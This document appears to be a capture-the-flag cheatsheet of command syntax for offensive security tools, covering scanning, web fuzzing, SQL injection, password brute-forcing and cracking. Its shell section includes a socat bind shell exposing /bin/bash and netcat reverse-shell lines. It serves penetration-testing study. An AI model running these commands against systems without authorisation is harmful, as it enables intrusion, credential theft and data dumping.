
# 🛠️ Tool Syntax Cheatsheet  
*"A tool is only as good as the hacker who wields it." - CTF Sage*

## 🔎 Reconnaissance Tools

### Nmap – Network Scanning
```bash
nmap -sV -T4 <IP>                   # Service/version scan
nmap -p- <IP>                       # Full port scan (1–65535)
nmap -A -T4 <IP>                    # Aggressive scan (OS + scripts)
nmap -sU -p 53,161 <IP>             # UDP scan (example: DNS, SNMP)
nmap -Pn -n <IP>                    # Skip host discovery + DNS
```

### Masscan – Fast Port Scanner
```bash
masscan <IP> -p1-65535 --rate=1000  # Full TCP scan with throttle
```

## 🌐 Web Enumeration

### FFUF – Fuzzing URLs/Parameters
```bash
ffuf -w wordlist.txt -u http://<IP>/FUZZ -mc 200
ffuf -w words.txt -u http://<IP>/page.php?id=FUZZ -fs 0
```

### Gobuster – Directory Bruteforcing
```bash
gobuster dir -u http://<IP> -w common.txt -x php,txt,html -t 50
gobuster dns -d domain.com -w subdomains.txt
```

### Nikto – Web Vulnerability Scanner
```bash
nikto -h http://<IP>                # Basic scan
```

## 🧪 Web Exploitation

### SQLMap – SQL Injection
```bash
sqlmap -u "http://<IP>/page?id=1" --batch --risk=3
sqlmap -r request.txt --dbs        # Use request file with headers
sqlmap -u <url> --dump-all         # Dump all databases
```

### Hydra – Bruteforce Login Forms
```bash
hydra -l admin -P rockyou.txt <IP> http-post-form \
"/login.php:user=^USER^&pass=^PASS^:F=incorrect"
hydra -L users.txt -P passwords.txt ssh://<IP>
```

## 🔑 Cracking & Hashing

### John the Ripper
```bash
john --wordlist=rockyou.txt hash.txt
john --format=raw-md5 hash.txt
john --show hash.txt                # Show cracked passwords
```

### Hashcat – GPU-Accelerated Cracking
```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt      # MD5
hashcat -m 1000 -a 0 hash.txt rockyou.txt   # NTLM
hashcat -m 1800 -a 0 hash.txt rockyou.txt   # sha512crypt
```

### HashID – Identify Hash Types
```bash
hashid "$1$O3JMY.Tw$AdLnLjQ/5jXF9..."
```

## 🐚 Shell Access & Interaction

### Netcat (nc)
```bash
nc -nvlp 4444                        # Listen for reverse shell
nc <IP> 4444                         # Send a shell
rlwrap nc -nvlp 4444                 # With readline support
```

### Socat
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
socat FILE:`tty`,raw,echo=0 TCP:<IP>:4444
```

## 📦 Enumeration & Discovery Tools

### Enum4linux – SMB Enumeration
```bash
enum4linux -a <IP>
```

### SMBclient – Connect to SMB Shares
```bash
smbclient //IP/share -U anonymous
```

### Wfuzz – Parameter & Auth Fuzzing
```bash
wfuzz -c -z file,wordlist.txt --hc 404 http://<IP>/FUZZ
```

## ⚙️ Wordlist Helpers

### CeWL – Custom Wordlist Generator
```bash
cewl http://site.com -w wordlist.txt
```

### Crunch – Custom Wordlist Generator
```bash
crunch 4 6 abc123 -o wordlist.txt   # 4–6 char words with abc123
```

## 🧰 Tool Installation (Debian/Ubuntu)
```bash
sudo apt install nmap ffuf gobuster sqlmap hydra \
john hashcat enum4linux smbclient seclists rlwrap
```

---

## 🔁 Bonus Tips

### Combine tools for better intel
```bash
nmap -p 80 <IP> --script=http-title
ffuf -w common.txt -u http://<IP>/FUZZ -mc 200 -o ffuf.json
```

### Use Seclists for wordlists
```bash
/usr/share/seclists/Discovery/Web-Content/common.txt
```

---

💡 *“Master the tools, but never forget the fundamentals.”*
